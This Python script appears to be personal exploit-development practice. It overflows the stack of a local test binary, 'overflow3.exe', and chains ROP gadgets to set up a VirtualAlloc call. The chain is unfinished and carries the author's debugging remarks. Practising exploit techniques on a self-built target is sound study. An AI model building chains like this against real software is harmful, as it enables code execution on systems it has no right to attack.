import struct
import subprocess

# Offset to the return address
junk = 296  # junk  (296 bytes)

payload = b"\x41" * junk

#rop gadgets for setting the R9 register value
###################################
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140000018)  # 0x40
payload += struct.pack("<Q", 0x140007678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", 0x140001b58)  # push rax; pop rbx; pop rsi; pop rdi; ret;
payload += b"\x90" * 16 
payload += struct.pack("<Q", 0x140007CA5)  # mov r9, rbx <see more below>

"""
0000000140007CA5 | 49:89D9                  | mov r9,rbx                           |
0000000140007CA8 | E8 D3FCFFFF              | call overflow3.140007980             |
0000000140007CAD | 48:98                    | cdqe                                 |
0000000140007CAF | 48:83C4 48               | add rsp,48                           |
0000000140007CB3 | 5B                       | pop rbx                              |
0000000140007CB4 | 5E                       | pop rsi                              |
0000000140007CB5 | 5F                       | pop rdi                              | 
0000000140007CB6 | 5D                       | pop rbp                              |
0000000140007CB7 | C3                       | ret                                  |
"""
payload += b"\x90" * 72 
payload += b"\x90" * 32 

#r8 ROP gadgets (this works but RDX MUST be 0x3000)

payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x1400095AC)  # place 3000 on stack --> 0x00000001400095AC = 0x3000
payload += struct.pack("<Q", 0x140007678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", 0x140006995)  # 0x0000000140006995: add edx, eax; mov eax, edx; ret; 
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x1400095A0)  # place 3000 - 0xC on stack 
payload += struct.pack("<Q", 0x140002410)  # 0000000140002410

#rop gadget(s) for setting the RCX register value
###################################################
payload += struct.pack("<Q", 0x14000276f)  # xor ecx, ecx; mov rax, r9; ret; 
# rcx should now be set to 0
###################################################

#rop gadgets for setting the RDX register value
#####################################################
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x140001243)  # mov edx, 2; xor ecx, ecx; call rax; 
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x1400000AC)  # place 1000 on stack --> 0x00000001400000AC = 0x1000
payload += struct.pack("<Q", 0x140007678)  # mov eax, dword ptr [rax]; ret;
payload += struct.pack("<Q", 0x140006995)  # add edx, eax; mov eax, edx; ret; 
# RDX should now be set to 1002 (ideally 1000 but I got tired of mathing :D )
######################################################


#VirtualAlloc !!!
######################################################
payload += struct.pack("<Q", 0x140001f8c)  # pop rax, ret;
payload += struct.pack("<Q", 0x14000D288)  # virtualalloc import address
payload += struct.pack("<Q", 0x140001fb3)  # jmp qword ptr [rax]; 
######################################################


# Run the vulnerable program and supply the payload
process = subprocess.Popen(
    ["C:/Users/robbi/Documents/GitHub/elevationstation_local/overflow3.exe"],  # Replace with the path to your compiled binary
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE
)

#uncomment to allow debugging in x64dbg
input("attach 'overflow.exe' to x64Dbg and press enter when you're ready to continue...")

# Send the payload
stdout, stderr = process.communicate(input=payload)

# Output the program's response
print(stdout.decode())
if stderr:
    print(stderr.decode())